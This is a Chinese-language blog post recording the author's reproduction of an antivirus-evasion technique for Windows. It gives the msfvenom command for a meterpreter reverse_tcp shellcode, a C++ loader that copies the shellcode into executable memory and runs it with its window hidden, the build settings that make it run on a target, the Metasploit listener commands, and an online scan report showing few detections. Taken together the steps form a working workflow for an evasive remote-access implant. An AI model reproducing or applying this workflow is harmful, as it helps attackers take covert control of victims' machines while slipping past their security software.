实验了一下这篇文章里面介绍的免杀方法：[使用 C 编译 shellcode 免杀上线](https://www.xljtj.com/archives/c-shellcode.html?from=timeline&isappinstalled=0)。这篇文章已经把步骤写的很清楚了，但是我会在本文中也记录清楚每一步，因为文章可能说没就没，记下来自己留个备份。顺便记下我遇到的几个mini tiny坑。

# 0x01 环境

- Vs 2019
- windows 10
- kali


# 0x02 msf 生成 shellcode

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机器IP（MSF的反弹IP） LPORT=攻击机器端口（MSF的反弹端口） -f c > shellcode.c

```


![title](https://leanote.com/api/file/getImage?fileId=5e9bab12ab64410e3d0012f8)

# 0x03 用 VS 生成可执行文件

这里有两个很小的点:

因为我和作者VS版本和目标环境的区别，第一，我在VS 2019里生成`控制台应用`的时候，是默认不带头文件的。所以在生成程序中，没有`pch.h`这个头文件。解决方法很简单，直接把`#include "pch.h"`这一句代码删掉就好。

![title](https://leanote.com/api/file/getImage?fileId=5e9baea9ab6441104c0012ee)

![title](https://leanote.com/api/file/getImage?fileId=5e9baf14ab64410e3d0013cd)


第二，如绿框中的`代码生成`→`运行库`选项及编译配置：

![title](https://leanote.com/api/file/getImage?fileId=5e9bb680ab64410e3d00152f)

如果我这么选，注意这里编译配置是`Debug x86`，那我可以成功生成exe，但是在运行的时候无法成功执行，目标机器上报错如下:


![title](https://leanote.com/api/file/getImage?fileId=5e9bafdeab64410e3d0013f9)

![title](https://leanote.com/api/file/getImage?fileId=5e9bafe6ab6441104c001324)


解决办法也不难:

- 项目`属性`→`代码生成`→`运行库`选 **多线程(/MT)**
- 编译配置选 `Release x86`


![title](https://leanote.com/api/file/getImage?fileId=5e9bb02eab6441104c001332)

------------


具体操作如下:

打开 vs2019，新建项目→`控制台应用(C++)`。

然后把 shellcode 复制到下面的代码里（我删掉了不存在的头）：


```
// MSF.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
#include <iostream>
#include "stdio.h"
#include "Windows.h"

#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")                        //去除窗口
//步骤b所在桌面产生的 shellcode.c的内容;
unsigned char shellcode[] =


void main()

{
    //ShellExecute(NULL, _T("open"), _T("explorer.exe"), _T("https://www.baiud.com"), NULL, SW_SHOW);
    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, shellcode, sizeof(shellcode));
    ((void(*)())Memory)();
}

```


再把 shellcode 全选复制到编辑器的代码框里：

![title](https://leanote.com/api/file/getImage?fileId=5e9bb192ab64410e3d001446)

修改编译配置为:

![title](https://leanote.com/api/file/getImage?fileId=5e9bb1dbab6441104c001388)

修改属性：项目里右键属性 → C/C++ → 代码生成 → 运行库：


![title](https://leanote.com/api/file/getImage?fileId=5e9bb1b7ab64410e3d001450)

保存之后，`重新生成解决方案`，就会生成一个 exe，这个 exe 运行即可上线：

![title](https://leanote.com/api/file/getImage?fileId=5e9bb240ab64410e3d001466)

这里按原作者的编译和运行库配置（`Debug x86 多线程测试(/MTd)`）生成的文件大小是38.5k，按我的配置生成的文件大小是79.0k。


# 0x04 测试上线

MSF 里开启监听：

```
use exploits/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.113.131
set lport 8090
run
```

执行 exe 即刻上线:

![title](https://leanote.com/api/file/getImage?fileId=5e9bb3deab6441104c0013e7)

# 0x05 免杀性检验


查杀网查杀地址：[MSF(2).exe](https://r.virscan.org/language/zh-cn/report/aab7bc6beead5b681de1f59563456e89)

看上去还行：

![title](https://leanote.com/api/file/getImage?fileId=5e9bb498ab64410e3d0014d6)


# 0x06 CS 上线

我也懒得搞了，两个端起起来有点麻烦：

> 如果要用 CS 上线，如下生成 payload：
![title](https://leanote.com/api/file/getImage?fileId=5e9bb516ab6441104c00141f)
后面操作是一样的。



--------------

# 参考链接：

1. [使用 C 编译 shellcode 免杀上线](https://www.xljtj.com/archives/c-shellcode.html?from=timeline&isappinstalled=0)，心灵鸡汤君's blog，心灵鸡汤君，2020 年 04 月 18 日